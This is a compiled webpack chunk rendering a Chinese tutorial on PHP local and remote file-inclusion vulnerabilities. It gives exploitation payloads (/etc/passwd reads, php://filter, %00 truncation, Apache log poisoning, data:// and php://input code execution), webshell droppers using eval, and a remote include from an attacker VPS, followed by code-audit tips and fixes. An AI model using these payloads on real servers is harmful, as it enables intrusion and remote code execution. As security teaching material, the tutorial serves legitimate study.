(window.webpackJsonp=window.webpackJsonp||[]).push([[71],{776:function(s,t,a){"use strict";a.r(t);var n=a(103),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"本地文件包含-lfi"}},[s._v("本地文件包含(LFI) "),a("a",{staticClass:"header-anchor",attrs:{href:"#本地文件包含-lfi"}},[s._v("#")])]),s._v(" "),a("p",[s._v("文件包含漏洞的产生原因是 PHP 语言在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。")]),s._v(" "),a("p",[s._v("当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。")]),s._v(" "),a("h3",{attrs:{id:"漏洞利用"}},[s._v("漏洞利用 "),a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞利用"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("利用条件：")])]),s._v(" "),a("blockquote",[a("p",[s._v("（1）include()等函数通过动态变量的方式引入包含文件；\n（2）用户能够控制该动态变量。")])]),s._v(" "),a("p",[a("strong",[s._v("1、读取敏感文件")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("?arg"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/etc/passwd\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("2、利用封装协议读源码")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("?arg"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("php://filter/read"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("convert.base64-encode/resource"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("config.php\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#这样能看到php文件的源码")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("3、包含图片Getshell")])]),s._v(" "),a("p",[s._v("在上传的图片中写入恶意代码，然后用 LFI 包含调用，就会执行图片里的PHP代码")]),s._v(" "),a("p",[a("strong",[s._v("4、截断包含")])]),s._v(" "),a("p",[s._v("漏洞代码：")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("isset")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'arg'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("include")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'arg'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('".php"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("include")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("index"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("php"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[s._v("这样做一定程度上修复了漏洞， 上传"),a("strong",[s._v("图片一句话")]),s._v("并访问："),a("code",[s._v("http://vuln.com/index.php?arg=1.jpg")]),s._v("会出错。")]),s._v(" "),a("p",[s._v("因为包含文件里面不存在"),a("code",[s._v("1.jpg.php")]),s._v("这个文件。")]),s._v(" "),a("p",[s._v("但是如果输入"),a("code",[s._v("http://vuln.com/index.php?arg=1.jpg%00")]),s._v("，就极有可能会绕过检测。")]),s._v(" "),a("p",[s._v("这种方法只适用于"),a("code",[s._v("php.ini")]),s._v("中"),a("code",[s._v("magic_quotes_qpc=off")]),s._v("并且"),a("code",[s._v("PHP")]),s._v("版本< 5.3.4的情况。")]),s._v(" "),a("p",[s._v("如果为on，%00会被转义，以至于无法截断。")]),s._v(" "),a("p",[a("strong",[s._v("5、包含Apache日志Getshell")])]),s._v(" "),a("blockquote",[a("p",[s._v("**条件：**知道日志文件access.log的存放位置 ，默认位置："),a("code",[s._v("/var/log/httpd/access_log")])])]),s._v(" "),a("p",[a("code",[s._v("access.log")]),s._v("文件记录了客户端每次请求的相关信息；\n当我们访问一个不存在的资源时"),a("code",[s._v("access.log")]),s._v("文件仍然会记录这条资源信息。")]),s._v(" "),a("p",[s._v("如果目标网站存在文件包含漏洞，但是没有可以包含的文件时，")]),s._v(" "),a("p",[s._v("我们就可以尝试访问"),a("code",[s._v("http://www.vuln.com/<?php phpinfo(); ?>")])]),s._v(" "),a("p",[s._v("Apache会将这条信息记录在access.log文件中，这时如果我们访问access.log文件，就会触发文件包含漏洞。")]),s._v(" "),a("p",[s._v("理论上是这样的，但是实际上却是输入的代码被转义无法解析。")]),s._v(" "),a("p",[s._v("攻击者可以通过burpsuite进行抓包在http请求包里面将转义的代码改为正常的测试代码就可以绕过。")]),s._v(" "),a("p",[s._v("这时再查看Apache日志文件，显示的就是正常的测试代码。")]),s._v(" "),a("p",[s._v("这时访问："),a("code",[s._v("http://www.vuln.com/index.php?arg=/var/log/httpd/access_log")]),s._v("，即可成功执行代码")]),s._v(" "),a("h3",{attrs:{id:"php中的封装协议-伪协议"}},[s._v("PHP中的封装协议(伪协议) "),a("a",{staticClass:"header-anchor",attrs:{href:"#php中的封装协议-伪协议"}},[s._v("#")])]),s._v(" "),a("p",[s._v("以下协议未写明条件的即是allow_url_fopen和allow_url_include状态off/on都行。")]),s._v(" "),a("h4",{attrs:{id:"file"}},[s._v("file:// "),a("a",{staticClass:"header-anchor",attrs:{href:"#file"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("作用：")])]),s._v(" "),a("p",[s._v("用于访问本地文件系统，在CTF中通常用来读取本地文件,且不受allow_url_fopen与allow_url_include的影响。")]),s._v(" "),a("p",[a("code",[s._v("include()/require()/include_once()/require_once()")]),s._v("参数可控的情况下")]),s._v(" "),a("p",[s._v("如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的")]),s._v(" "),a("p",[a("strong",[s._v("示例：")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#1. file://[文件的绝对路径和文件名]")]),s._v("\nhttp://127.0.0.1/include.php?file"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("file://C:"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("phpStudy"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("PHPTutorial"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("WWW"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("phpinfo.txt\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#2. file://[文件的相对路径和文件名]")]),s._v("\nhttp://127.0.0.1/include.php?file"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("./phpinfo.txt\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#3. file://[网络路径和文件名]")]),s._v("\nhttp://127.0.0.1/include.php?file"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("http://127.0.0.1/phpinfo.txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("h4",{attrs:{id:"php"}},[s._v("php:// "),a("a",{staticClass:"header-anchor",attrs:{href:"#php"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("条件：")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("allow_url_fopen:off/on\n\nallow_url_include : 部分需要on (下面列出)\n\nphp://input\n\nphp://stdin\n\nphp://memory \n\nphp://temp\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br")])]),a("p",[a("strong",[s._v("作用：")])]),s._v(" "),a("p",[s._v("php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是 "),a("code",[s._v("php://filter")]),s._v(" 和 "),a("code",[s._v("php://input")])]),s._v(" "),a("p",[s._v("php://filter用于"),a("strong",[s._v("读取源码")]),s._v("，php://input用于"),a("strong",[s._v("执行")]),s._v("php代码")]),s._v(" "),a("p",[a("strong",[s._v("示例：")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#1. php://filter/read=convert.base64-encode/resource=[文件名]  //读取文件源码")]),s._v("\nhttp://127.0.0.1/include.php?file"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("php://filter/read"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("convert.base64-encode/resource"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("phpinfo.php\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#2.php://input + [POST DATA]执行php代码")]),s._v("\nhttp://127.0.0.1/include.php?file"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("php://input\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("POST DATA部分"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("?php phpinfo"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" ?"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#3.若有写入权限，[POST DATA部分] 写入一句话木马")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("?php fputs"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("fopen"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'shell.php'")]),s._v(","),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'w'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(","),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'<?php @eval("),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),s._v("[cmd]); ?>'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" ?"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("h4",{attrs:{id:"zip-bzip2-zlib"}},[s._v("zip:// & bzip2:// & zlib:// "),a("a",{staticClass:"header-anchor",attrs:{href:"#zip-bzip2-zlib"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("作用：")])]),s._v(" "),a("p",[a("code",[s._v("zip:// & bzip2:// & zlib://")]),s._v(" 均属于压缩流，可以访问压缩文件中的子文件")]),s._v(" "),a("p",[s._v("更重要的是不需要指定后缀名，可修改为任意后缀："),a("code",[s._v("jpg png gif xxx")]),s._v(" 等等")]),s._v(" "),a("p",[a("strong",[s._v("示例：")])]),s._v(" "),a("div",{staticClass:"language-html line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[s._v("1.zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("\x3c!--压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传--\x3e")]),s._v("\nhttp://127.0.0.1/include.php?file=zip://C:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt\n\n2.compress.bzip2://file.bz2\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("\x3c!--压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）--\x3e")]),s._v("\nhttp://127.0.0.1/include.php?file=compress.bzip2://C:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.bz2\n\n3.compress.zlib://file.gz \n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("\x3c!--压缩 phpinfo.txt 为 phpinfo.gz--\x3e")]),s._v("\nhttp://127.0.0.1/include.php?file=compress.zlib://C:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.gz\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br")])]),a("h4",{attrs:{id:"data"}},[s._v("data:// "),a("a",{staticClass:"header-anchor",attrs:{href:"#data"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("条件：")])]),s._v(" "),a("p",[s._v("allow_url_fopen:on")]),s._v(" "),a("p",[s._v("allow_url_include :on")]),s._v(" "),a("p",[a("strong",[s._v("作用：")])]),s._v(" "),a("p",[s._v("自"),a("code",[s._v("PHP>=5.2.0")]),s._v("起，可以使用 "),a("code",[s._v("data://")]),s._v(" 数据流封装器，以传递相应格式的数据。")]),s._v(" "),a("p",[s._v("通常可以用来执行PHP代码")]),s._v(" "),a("p",[a("strong",[s._v("示例：")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#1.data://text/plain,")]),s._v("\nhttp://127.0.0.1/include.php?file"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("data://text/plain,"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("?php%20phpinfo"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("?"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#2.data://text/plain;base64,")]),s._v("\nhttp://127.0.0.1/include.php?file"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("data://text/plain"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("base64,PD9waHAgcGhwaW5mbygpOz8%2b\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("h4",{attrs:{id:"phar"}},[s._v("phar:// "),a("a",{staticClass:"header-anchor",attrs:{href:"#phar"}},[s._v("#")])]),s._v(" "),a("p",[s._v("phar://协议与zip://类似，同样可以访问zip格式压缩包内容")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("http://127.0.0.1/include.php?file"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("phar://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("利用条件 "),a("code",[s._v("PHP > 5.3")])])]),s._v(" "),a("p",[s._v("要想使用Phar类里的方法，必须将"),a("code",[s._v("phar.readonly")]),s._v("配置项配置为0或Off")]),s._v(" "),a("p",[s._v("利用 phar 协议可以拓展 php 反序列化漏洞攻击面")]),s._v(" "),a("h2",{attrs:{id:"远程文件包含-rfl"}},[s._v("远程文件包含(RFL) "),a("a",{staticClass:"header-anchor",attrs:{href:"#远程文件包含-rfl"}},[s._v("#")])]),s._v(" "),a("p",[s._v("服务器通过 PHP 的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严格，")]),s._v(" "),a("p",[s._v("从而可以去包含一个恶意文件，攻击者就可以远程构造一个特定的恶意文件达到攻击目的。")]),s._v(" "),a("h3",{attrs:{id:"漏洞利用-2"}},[s._v("漏洞利用 "),a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞利用-2"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("条件：")]),a("code",[s._v("php.ini")]),s._v("中开启"),a("code",[s._v("allow_url_include")]),s._v("、"),a("code",[s._v("allow_url_fopen")]),s._v("选项。")]),s._v(" "),a("p",[a("strong",[s._v("1、远程包含Webshell")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("?arg"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("http://攻击者的VPS/shell.txt\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#会在网站目录生成名为 shell.php 的一句话木马")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("strong",[s._v("shell.txt内容为：")])]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("fputs")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("fopen")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'./shell.php'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'w'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'<?php @eval($_POST[123]) ?>'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("h3",{attrs:{id:"代码审计"}},[s._v("代码审计 "),a("a",{staticClass:"header-anchor",attrs:{href:"#代码审计"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("文件包含用到的函数")])]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("include")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("inclue_once")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("require")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//使用此函数，只要程序执行，立即调用此函数包含文件发生错误时，会输出错误信息并立即终止程序。")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("require_once")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("代码审计的时候全局搜索以上函数")]),s._v(" "),a("p",[s._v("如果是基于图像上传的 ，要搜"),a("code",[s._v("$_FILES")]),s._v(" 变量， 因为PHP处理上传文件的功能，基本都与$_FILES有关。")]),s._v(" "),a("p",[s._v("查看目录结构，重点关注includes、modules等文件夹，查看index.php等文件是否"),a("strong",[s._v("动态调用")]),s._v("过这些内容，变量是否可控。")]),s._v(" "),a("h2",{attrs:{id:"修复建议"}},[s._v("修复建议 "),a("a",{staticClass:"header-anchor",attrs:{href:"#修复建议"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("ol",[a("li",[s._v("禁止远程文件包含 "),a("code",[s._v("allow_url_include=off")])]),s._v(" "),a("li",[s._v("配置 "),a("code",[s._v("open_basedir=指定目录")]),s._v("，限制访问区域。")]),s._v(" "),a("li",[s._v("过滤"),a("code",[s._v("../")]),s._v("等特殊符号")]),s._v(" "),a("li",[s._v("修改Apache日志文件的存放地址")]),s._v(" "),a("li",[s._v("开启魔术引号 "),a("code",[s._v("magic_quotes_qpc=on")])]),s._v(" "),a("li",[s._v("尽量不要使用动态变量调用文件，直接写要包含的文件。")])])])])}),[],!1,null,null,null);t.default=e.exports}}]);